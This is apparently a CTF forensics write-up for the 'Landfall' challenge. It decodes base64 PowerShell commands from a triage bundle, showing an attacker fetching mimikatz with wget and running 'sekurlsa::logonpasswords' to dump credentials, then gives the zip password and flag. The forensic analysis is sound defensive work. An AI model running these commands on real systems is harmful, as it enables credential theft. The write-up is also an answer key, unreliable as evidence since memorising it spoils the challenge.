# Landfall Writeup

## Challenge Info

- Category: `Forensics`
- Challenge: `Landfall`
- Files provided locally:
  - `briefing.txt`
  - `DESCRIPTION.md`
  - `how-to-solve.txt`
  - `checkpointA.zip`

The briefing asks:

> What command did the threat actor attempt to execute to obtain credentials for privilege escalation?

It also gives the key solve condition:

> The password to Checkpoint A is ONLY the encoded portion. The password is MD5 hash of this portion.

The full triage archive is referenced in `DESCRIPTION.md` as:

`https://cdn.utctf.live/Modified_KAPE_Triage_Files.zip`

## Goal

Find the exact command the attacker attempted to run for credential dumping, identify the encoded portion of that command, hash it with MD5, then use that MD5 as the password for `checkpointA.zip`.

## Triage Strategy

Because the question is specifically about a command execution attempt, the most relevant artifacts are:

- PowerShell command history
- Windows Defender detections
- Other command-execution traces if needed

After extracting the triage bundle, the highest-signal artifact was:

`triage/Modified_KAPE_Triage_Files/C/Users/jon/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`

## Key Evidence

### 1. PowerShell History

The attacker activity is directly visible in:

`triage/Modified_KAPE_Triage_Files/C/Users/jon/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`

Relevant lines:

```text
8:  powershell -e dwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBlAG4AdABpAGwAawBpAHcAaQAvAG0AaQBtAGkAawBhAHQAegAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgAyAC4AMAAtADIAMAAyADIAMAA5ADEAOQAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwAA==
10: powershell -e dwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBlAG4AdABpAGwAawBpAHcAaQAvAG0AaQBtAGkAawBhAHQAegAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgAyAC4AMAAtADIAMAAyADIAMAA5ADEAOQAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwACAALQBPACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA
12: powershell -e -nop RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA
13: powershell -nop -e RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA
15: powershell -nop -e QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA==
```

This is enough to reconstruct the attacker workflow:

1. Download `mimikatz_trunk.zip` from GitHub.
2. Save it as `mimikatz.zip`.
3. Expand the ZIP.
4. Execute `mimikatz.exe` with credential-dumping arguments.

### 2. Decoding the Base64 Commands

These PowerShell `-e` payloads are UTF-16LE Base64. Decoding them gives:

```text
dwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBlAG4AdABpAGwAawBpAHcAaQAvAG0AaQBtAGkAawBhAHQAegAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgAyAC4AMAAtADIAMAAyADIAMAA5ADEAOQAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwAA==
-> wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

dwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBlAG4AdABpAGwAawBpAHcAaQAvAG0AaQBtAGkAawBhAHQAegAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgAyAC4AMAAtADIAMAAyADIAMAA5ADEAOQAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwACAALQBPACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA
-> wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimikatz.zip

RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAbQBpAG0AaQBrAGEAdAB6AC4AegBpAHAA
-> Expand-Archive mimikatz.zip

QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA==
-> C:\Users\jon\Downloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

The command requested by the challenge is therefore:

```text
C:\Users\jon\Downloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

That makes sense for the prompt: `sekurlsa::logonpasswords` is the classic Mimikatz command for pulling credentials from LSASS.

### 3. Windows Defender Corroboration

The same execution attempt is also captured by Windows Defender in:

`triage/Modified_KAPE_Triage_Files/C/ProgramData/Microsoft/Windows Defender/Support/MPLog-20260308-214855.log`

Relevant entries include:

- `CmdLine` with the same PowerShell `-nop -e ...` invocation
- threat name `HackTool:Win32/Mimikatz.I`

Examples are visible around lines `5924`, `5936`, `6007`, and `6023` in the extracted log view.

This confirms that the PowerShell command was not just typed; Defender observed and flagged the attempted Mimikatz execution.

## Reproducing the Solve

### Step 1. Decode the final Base64 payload

```bash
python3 - <<'PY'
import base64
s = "QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA=="
print(base64.b64decode(s).decode("utf-16le"))
PY
```

Output:

```text
C:\Users\jon\Downloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Step 2. Build the ZIP password

Per the hint in `briefing.txt`, the password is the MD5 of only the encoded portion from the final command:

```text
QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA==
```

Hash it:

```bash
python3 - <<'PY'
import hashlib
s = "QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA=="
print(hashlib.md5(s.encode()).hexdigest())
PY
```

Output:

```text
00c8e4a884db2d90b47a4c64f3aec1a4
```

So the password for `checkpointA.zip` is:

```text
00c8e4a884db2d90b47a4c64f3aec1a4
```

### Step 3. Extract the flag

```bash
unzip -P 00c8e4a884db2d90b47a4c64f3aec1a4 -p checkpointA.zip flag.txt
```

Output:

```text
utflag{4774ck3r5_h4v3_m4d3_l4ndf4ll}
```

## Final Answers

- Attempted credential-dumping command:

```text
C:\Users\jon\Downloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

- Encoded portion:

```text
QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA==
```

- MD5 / ZIP password:

```text
00c8e4a884db2d90b47a4c64f3aec1a4
```

- Flag:

```text
utflag{4774ck3r5_h4v3_m4d3_l4ndf4ll}
```
